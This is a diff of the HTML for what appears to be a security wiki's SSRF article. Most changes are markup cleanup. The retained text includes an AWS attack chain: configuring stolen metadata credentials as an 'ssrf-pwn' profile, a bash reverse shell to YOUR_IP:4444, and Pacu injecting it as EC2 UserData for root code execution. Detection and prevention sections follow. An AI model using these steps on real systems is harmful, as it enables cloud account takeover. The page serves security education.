+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws configure --profile ssrf-pwn 
 </span></span><span style="display:flex;"><span>*# Paste AccessKeyId, SecretAccessKey, Token
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Region from /latest/meta-data/placement/region*</span>
-</span></span></code></pre></div></li>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Region from /latest/meta-data/placement/region*</span></span></span></code></pre></div></li>
 <li>
 <p><strong>Inject malicious UserData for RCE on next boot</strong>
 UserData scripts execute as root during instance initialization.
 Create reverse shell script (rev.sh):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;<span style="color:#ae81ff">1</span>
-</span></span></code></pre></div><p>One-liner execution (using Pacu or manual):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws configure --profile ssrf-pwn
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;<span style="color:#ae81ff">1</span></span></span></code></pre></div><p>One-liner execution (using Pacu or manual):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws configure --profile ssrf-pwn
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Paste AccessKeyId, SecretAccessKey, Token</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Region from /latest/meta-data/placement/region</span>
-</span></span></code></pre></div><p>Pacu one-liner (recommended):</p>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Region from /latest/meta-data/placement/region</span></span></span></code></pre></div><p>Pacu one-liner (recommended):</p>
 <p><code>run ec2__startup_shell_script --script rev.sh --instance-ids i-0123456789abcdef0</code></p>
 </li>
 <li>
@@ -1829,14 +1735,8 @@ If the role has iam:CreatePolicyVersion or iam:PutRolePolicy, attach Administrat
 </ol>
 <p><strong>Impact</strong>
 Escalates a filtered SSRF to complete root-level compromise of the EC2 instance and potentially the entire AWS account when IMDSv1 is enabled.</p>
-<h2 id="detection-techniques">
-  Detection Techniques
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h3 id="manual-testing">
-  Manual Testing
-  <a class="anchor" href="#manual-testing">#</a>
-</h3>
+<h2 id="detection-techniques">Detection Techniques<a class="anchor" href="#detection-techniques">#</a></h2>
+<h3 id="manual-testing">Manual Testing<a class="anchor" href="#manual-testing">#</a></h3>
 <ol>
 <li>Crawl the entire application and list every parameter that accepts a full URL, hostname, or IP (including JSON bodies, headers, and JS variables).</li>
 <li>Submit your personal Interactsh/Burp Collaborator URL (e.g., <a href="https://abcd1234.oastify.com/" target="_blank" rel="noreferrer noopener nofollow">https://abcd1234.oastify.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">) and verify you receive a DNS/HTTP callback.</li>
@@ -1852,10 +1752,7 @@ Escalates a filtered SSRF to complete root-level compromise of the EC2 instance 
 <li>Identify any open redirect on a whitelisted domain and chain it with an internal target (e.g., ?redirect=<a href="http://169.254.169.254/" target="_blank" rel="noreferrer noopener nofollow">http://169.254.169.254/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">).</li>
 <li>Repeat the entire process with all bypass techniques (decimal IPs, encoded dots, DNS rebinding domains, etc.) if basic payloads are blocked.</li>
 </ol>
-<h3 id="automated-tools">
-  Automated Tools
-  <a class="anchor" href="#automated-tools">#</a>
-</h3>
+<h3 id="automated-tools">Automated Tools<a class="anchor" href="#automated-tools">#</a></h3>
 <ul>
 <li>
 <p><a href="https://github.com/Dancas93/SSRF-Scanner" target="_blank" rel="noreferrer noopener nofollow">https://github.com/Dancas93/SSRF-Scanner</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">: Automates SSRF parameter discovery and testing.</p>
@@ -1873,10 +1770,7 @@ Escalates a filtered SSRF to complete root-level compromise of the EC2 instance 
 <p><a href="https://github.com/Dancas93/SSRF-Scanner" target="_blank" rel="noreferrer noopener nofollow">SSRF Scanner</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">: Burp extension to Identify SSRF parameters in requests.</p>
 </li>
 </ul>
-<h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
+<h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <ul>
 <li>Full internal network reconnaissance and port scanning across private IP ranges, exposing hidden services and infrastructure layout.</li>
 <li>Retrieval of cloud instance metadata and temporary IAM/role credentials, often leading to complete compromise of the AWS, GCP, or Azure environment.</li>
@@ -1884,10 +1778,7 @@ Escalates a filtered SSRF to complete root-level compromise of the EC2 instance 
 <li>Remote code execution via exploitation of unprotected internal services (e.g., Redis, databases, message queues).</li>
 <li>Lateral movement and pivoting to other internal systems, enabling deeper network compromise and potential full infrastructure takeover.</li>
 </ul>
-<h2 id="prevention-techniques">
-  Prevention Techniques
-  <a class="anchor" href="#prevention-techniques">#</a>
-</h2>
+<h2 id="prevention-techniques">Prevention Techniques<a class="anchor" href="#prevention-techniques">#</a></h2>
 <ul>
 <li>Enforce strict allow-listing of permitted domains and IP ranges while rejecting everything else by default.</li>
 <li>Block all private, reserved, and loopback IP ranges (RFC 1918, 169.254.0.0/16, 127.0.0.0/8, ::1, fc00::/7) at both application and network levels.</li>
@@ -1896,17 +1787,11 @@ Escalates a filtered SSRF to complete root-level compromise of the EC2 instance 
 <li>Require authentication and authorization on every internal service (Redis, Memcached, databases, queues, etc.), even within private networks.</li>
 <li>Use hardened HTTP clients and URL parsers that reject non-canonical forms, private IPs, and unexpected schemes by default.</li>
 </ul>
-<h2 id="good-to-read">
-  Good to Read:
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
+<h2 id="good-to-read">Good to Read:<a class="anchor" href="#good-to-read">#</a></h2>
 <p><a href="https://hackerone.com/reports/2262382" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/2262382</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://hackerone.com/reports/514224" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/514224</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://hackerone.com/reports/341876" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/341876</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
-<h2 id="references">
-  References:
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References:<a class="anchor" href="#references">#</a></h2>
 <p><a href="https://medium.com/@armaanpathan/pdfreacter-ssrf-to-root-level-local-file-read-which-led-to-rce-eb460ffb3129" target="_blank" rel="noreferrer noopener nofollow">https://medium.com/@armaanpathan/pdfreacter-ssrf-to-root-level-local-file-read-which-led-to-rce-eb460ffb3129</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="http://payatu.com/blog/a-basic-approach-to-ssrf/" target="_blank" rel="noreferrer noopener nofollow">http://payatu.com/blog/a-basic-approach-to-ssrf/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html" target="_blank" rel="noreferrer noopener nofollow">https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
@@ -1928,49 +1813,62 @@ Escalates a filtered SSRF to complete root-level compromise of the EC2 instance 
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Server-Side%20Request%20Forgery%20%28SSRF%29.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Sensitive-Data-Exposure/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Sensitive Data Exposure</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="flex align-center">
+        <span>Server-Side Template Injection (SSTI)</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -2019,15 +1917,24 @@ Escalates a filtered SSRF to complete root-level compromise of the EC2 instance 
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
